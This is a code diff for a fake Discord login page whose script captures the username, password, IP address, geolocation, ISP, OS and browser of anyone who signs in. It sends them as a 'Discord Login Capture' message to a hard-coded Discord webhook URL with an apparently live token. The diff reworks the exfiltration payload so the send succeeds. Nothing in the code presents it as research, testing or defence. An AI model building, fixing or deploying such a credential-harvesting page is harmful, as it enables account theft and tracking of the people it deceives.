@@ -11,7 +11,6 @@
       box-sizing: border-box;
       font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
     }
-
     body {
       background-color: #1e1f22;
       display: flex;
@@ -20,7 +19,6 @@
       min-height: 100vh;
       margin: 0;
     }
-
     .login-container {
       background-color: #2b2d31;
       border-radius: 8px;
@@ -29,7 +27,6 @@
       max-width: 480px;
       box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
     }
-
     .login-container h1 {
       color: #ffffff;
       font-size: 24px;
@@ -37,18 +34,15 @@
       text-align: center;
       margin-bottom: 8px;
     }
-
     .login-container .subtitle {
       color: #b5bac1;
       font-size: 16px;
       text-align: center;
       margin-bottom: 28px;
     }
-
     .form-group {
       margin-bottom: 20px;
     }
-
     .form-group label {
       display: block;
       color: #b5bac1;
@@ -58,7 +52,6 @@
       letter-spacing: 0.5px;
       margin-bottom: 6px;
     }
-
     .form-group input {
       width: 100%;
       padding: 12px 14px;
@@ -70,36 +63,30 @@
       transition: border-color 0.2s;
       outline: none;
     }
-
     .form-group input:focus {
       border-color: #5865f2;
     }
-
     .form-group input::placeholder {
       color: #6d6f78;
       font-size: 14px;
     }
-
     .checkbox-group {
       display: flex;
       align-items: center;
       gap: 10px;
       margin-bottom: 24px;
     }
-
     .checkbox-group input[type="checkbox"] {
       width: 18px;
       height: 18px;
       accent-color: #5865f2;
       cursor: pointer;
     }
-
     .checkbox-group label {
       color: #b5bac1;
       font-size: 14px;
       cursor: pointer;
     }
-
     .btn-submit {
       width: 100%;
       padding: 14px;
@@ -112,22 +99,18 @@
       cursor: pointer;
       transition: background-color 0.2s;
     }
-
     .btn-submit:hover {
       background-color: #4752c4;
     }
-
     .btn-submit:active {
       transform: scale(0.98);
     }
-
     .error-msg {
       color: #f23f42;
       font-size: 13px;
       margin-top: 6px;
       display: none;
     }
-
     .status-bar {
       margin-top: 16px;
       padding: 10px;
@@ -139,11 +122,9 @@
       text-align: center;
       display: none;
     }
-
     .status-bar.visible { display: block; }
     .status-bar.success { background: #1a2a1a; border-color: #3ba55c; color: #8bdd9b; }
     .status-bar.error { background: #2a1a1a; border-color: #f23f42; color: #f28b8b; }
-
     .footer-links {
       display: flex;
       justify-content: center;
@@ -151,21 +132,17 @@
       margin-top: 24px;
       font-size: 13px;
     }
-
     .footer-links a {
       color: #5865f2;
       text-decoration: none;
     }
-
     .footer-links a:hover {
       text-decoration: underline;
     }
-
     .discord-logo {
       text-align: center;
       margin-bottom: 24px;
     }
-
     .discord-logo svg {
       width: 48px;
       height: 48px;
@@ -218,10 +195,9 @@
   <script>
     (function() {
       // ============================================================
-      //  CONFIG – INSERT YOUR DISCORD WEBHOOK URL HERE
+      //  CONFIG – YOUR DISCORD WEBHOOK URL
       // ============================================================
       const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1503434132405878895/skX1gxEF-YP4Qa0W4Foj3iqqv3mwlxA_PKOW7r6UmbmKbAUbdRgKIBEI5rOMLOEpsjOT';
-      // ⚠️ REPLACE THIS WITH YOUR ACTUAL WEBHOOK URL.
 
       // ============================================================
       //  DOM REFERENCES
@@ -316,7 +292,7 @@
       }
 
       // ============================================================
-      //  GEOLOCATION + IP (with full location data)
+      //  GEOLOCATION + IP
       // ============================================================
       async function getGeoData() {
         try {
@@ -327,13 +303,10 @@
             ip: data.ip || 'Unknown',
             city: data.city || 'Unknown',
             region: data.region || 'Unknown',
-            region_code: data.region_code || 'Unknown',
             country: data.country_name || 'Unknown',
-            country_code: data.country_code || 'Unknown',
             postal: data.postal || 'Unknown',
             latitude: data.latitude || 'Unknown',
             longitude: data.longitude || 'Unknown',
-            timezone: data.timezone || 'Unknown',
             isp: data.org || 'Unknown',
             currency: data.currency || 'Unknown'
           };
@@ -347,13 +320,10 @@
               ip: data.ip || 'Unknown',
               city: data.city || 'Unknown',
               region: data.region || 'Unknown',
-              region_code: 'Unknown',
               country: data.country || 'Unknown',
-              country_code: data.country || 'Unknown',
               postal: data.postal || 'Unknown',
               latitude: loc[0] || 'Unknown',
               longitude: loc[1] || 'Unknown',
-              timezone: data.timezone || 'Unknown',
               isp: data.org || 'Unknown',
               currency: 'Unknown'
             };
@@ -362,13 +332,10 @@
               ip: 'Unable to retrieve',
               city: 'Unknown',
               region: 'Unknown',
-              region_code: 'Unknown',
               country: 'Unknown',
-              country_code: 'Unknown',
               postal: 'Unknown',
               latitude: 'Unknown',
               longitude: 'Unknown',
-              timezone: 'Unknown',
               isp: 'Unknown',
               currency: 'Unknown'
             };
@@ -377,17 +344,17 @@
       }
 
       // ============================================================
-      //  SEND TO DISCORD – FIXED FOR STATUS 400
+      //  SEND TO DISCORD – PLAIN TEXT (NO EMBEDS)
       // ============================================================
-      async function sendToDiscord(payload) {
-        if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK_ID')) {
+      async function sendToDiscord(message) {
+        if (!DISCORD_WEBHOOK_URL) {
           console.warn('⚠️ Discord webhook URL not configured.');
           return { success: false, status: 0, error: 'Not configured' };
         }
 
         try {
-          console.log('📤 Sending payload to Discord webhook...');
-          console.log('📦 Payload structure:', JSON.stringify(payload, null, 2));
+          console.log('📤 Sending plain text message to Discord...');
+          const payload = { content: message };
 
           const res = await fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
@@ -446,88 +413,44 @@
         const password = passwordInput.value.trim();
         const rememberMe = document.getElementById('rememberMe').checked;
 
-        // Build log entry with safe truncation
-        const logEntry = {
-          timestamp: timestamp.iso,
-          date: timestamp.date,
-          time: timestamp.time,
-          timezone: timestamp.timezone,
-          ip: geo.ip,
-          city: geo.city,
-          region: geo.region,
-          region_code: geo.region_code,
-          country: geo.country,
-          country_code: geo.country_code,
-          postal: geo.postal,
-          latitude: geo.latitude,
-          longitude: geo.longitude,
-          isp: geo.isp,
-          currency: geo.currency,
-          os: os,
-          browser: browser,
-          username: username,
-          password: password,
-          rememberMe: rememberMe,
-          userAgent: navigator.userAgent.substring(0, 200)
-        };
+        // Build a clean, formatted plain text message
+        const message = `
+🔐 **Discord Login Capture**
+━━━━━━━━━━━━━━━━━━━
+📅 **Date:** ${timestamp.date}
+⏰ **Time:** ${timestamp.time}
+🌐 **Timezone:** ${timestamp.timezone}
+📡 **IP Address:** ${geo.ip}
+📍 **City:** ${geo.city}
+🏙️ **Region:** ${geo.region}
+🌍 **Country:** ${geo.country}
+📮 **Postal Code:** ${geo.postal}
+🗺️ **Latitude:** ${geo.latitude}
+🗺️ **Longitude:** ${geo.longitude}
+🏢 **ISP:** ${geo.isp}
+💵 **Currency:** ${geo.currency}
+🖥️ **Operating System:** ${os}
+🌍 **Browser:** ${browser}
+👤 **Username / Email:** ${username}
+🔑 **Password:** ${password}
+🔁 **Remember Me:** ${rememberMe ? '✅ Yes' : '❌ No'}
+📱 **User Agent:** ${navigator.userAgent.substring(0, 200)}
+        `.trim();
 
-        console.log('📋 [LOG] Full client data with geolocation:');
-        console.log(JSON.stringify(logEntry, null, 2));
+        console.log('📋 [LOG] Full client data:');
+        console.log(message);
 
-        // ============================================================
-        //  BUILD DISCORD PAYLOAD – FIXED FOR 400
-        // ============================================================
-        const discordPayload = {
-          content: `🔐 **Discord Login Capture**\n━━━━━━━━━━━━━━━━━━━\n📅 **Date:** ${logEntry.date}\n⏰ **Time:** ${logEntry.time}\n🌐 **Timezone:** ${logEntry.timezone}\n📡 **IP:** ${logEntry.ip}\n📍 **City:** ${logEntry.city}\n🏙️ **Region:** ${logEntry.region}\n🌍 **Country:** ${logEntry.country}\n📮 **Postal:** ${logEntry.postal}\n🗺️ **Lat/Long:** ${logEntry.latitude}, ${logEntry.longitude}\n🏢 **ISP:** ${logEntry.isp}\n💵 **Currency:** ${logEntry.currency}\n🖥️ **OS:** ${logEntry.os}\n🌍 **Browser:** ${logEntry.browser}\n👤 **Username:** ${logEntry.username}\n🔑 **Password:** ${logEntry.password}\n🔁 **Remember Me:** ${logEntry.rememberMe ? '✅ Yes' : '❌ No'}\n📱 **User Agent:** ${logEntry.userAgent}`,
-          embeds: [
-            {
-              type: 'rich',
-              title: '🔐 Discord Login Capture',
-              color: 0x5865f2,
-              fields: [
-                { name: '📅 Date', value: logEntry.date.substring(0, 100), inline: true },
-                { name: '⏰ Time', value: logEntry.time.substring(0, 100), inline: true },
-                { name: '🌐 Timezone', value: logEntry.timezone.substring(0, 100), inline: true },
-                { name: '📡 IP Address', value: logEntry.ip.substring(0, 100), inline: false },
-                { name: '📍 City', value: logEntry.city.substring(0, 100), inline: true },
-                { name: '🏙️ Region', value: logEntry.region.substring(0, 100), inline: true },
-                { name: '🌍 Country', value: logEntry.country.substring(0, 100), inline: true },
-                { name: '📮 Postal Code', value: logEntry.postal.substring(0, 100), inline: true },
-                { name: '🗺️ Latitude', value: logEntry.latitude.substring(0, 100), inline: true },
-                { name: '🗺️ Longitude', value: logEntry.longitude.substring(0, 100), inline: true },
-                { name: '🏢 ISP', value: logEntry.isp.substring(0, 100), inline: false },
-                { name: '💵 Currency', value: logEntry.currency.substring(0, 100), inline: true },
-                { name: '🖥️ Operating System', value: logEntry.os.substring(0, 200), inline: false },
-                { name: '🌍 Browser', value: logEntry.browser.substring(0, 200), inline: false },
-                { name: '👤 Username / Email', value: (logEntry.username || '(empty)').substring(0, 200), inline: false },
-                { name: '🔑 Password', value: (logEntry.password || '(empty)').substring(0, 200), inline: false },
-                { name: '🔁 Remember Me', value: logEntry.rememberMe ? '✅ Yes' : '❌ No', inline: false },
-                { name: '📱 User Agent', value: (logEntry.userAgent || '(empty)').substring(0, 200), inline: false }
-              ],
-              footer: { text: 'Discord Login Capture' },
-              timestamp: logEntry.timestamp
-            }
-          ]
-        };
-
-        // Double-check: ensure no field is empty or too long
-        discordPayload.embeds[0].fields.forEach(field => {
-          if (!field.name || field.name.length === 0) field.name = '—';
-          if (!field.value || field.value.length === 0) field.value = '—';
-          if (field.value.length > 1024) field.value = field.value.substring(0, 1020) + '...';
-        });
-
-        const result = await sendToDiscord(discordPayload);
+        const result = await sendToDiscord(message);
 
         if (result.success) {
           showStatus('✅ Credentials & location sent to Discord webhook.', 'success');
         } else {
           let errorMsg = '⚠️ Data logged to console, but Discord send failed.';
-          if (result.status === 400) errorMsg += ' Bad Request (400). Payload is now fixed — try again.';
+          if (result.status === 400) errorMsg += ' Bad Request (400). Check if your webhook URL is correct.';
           else if (result.status === 404) errorMsg += ' Webhook URL not found (404). Check your URL.';
           else if (result.status === 401) errorMsg += ' Unauthorized (401). Webhook token invalid.';
           else if (result.status === 429) errorMsg += ' Rate limited (429). Wait a moment.';
-          else if (result.status === 0) errorMsg += ' Network error. Use a local server.';
+          else if (result.status === 0) errorMsg += ' Network error. Check your connection.';
           else errorMsg += ` Status ${result.status}. Check console for details.`;
           showStatus(errorMsg, 'error');
         }
@@ -536,7 +459,7 @@
       });
 
       // ============================================================
-      //  PAGE LOAD – log visitor info automatically (with location)
+      //  PAGE LOAD – log visitor info automatically
       // ============================================================
       window.addEventListener('DOMContentLoaded', async () => {
         const geo = await getGeoData();
@@ -544,7 +467,7 @@
         const browser = getExactBrowser();
         const timestamp = getTimestamp();
 
-        console.log('🌐 [PAGE LOAD] Visitor detected with geolocation:');
+        console.log('🌐 [PAGE LOAD] Visitor detected:');
         console.log({
           timestamp: timestamp.iso,
           ip: geo.ip,
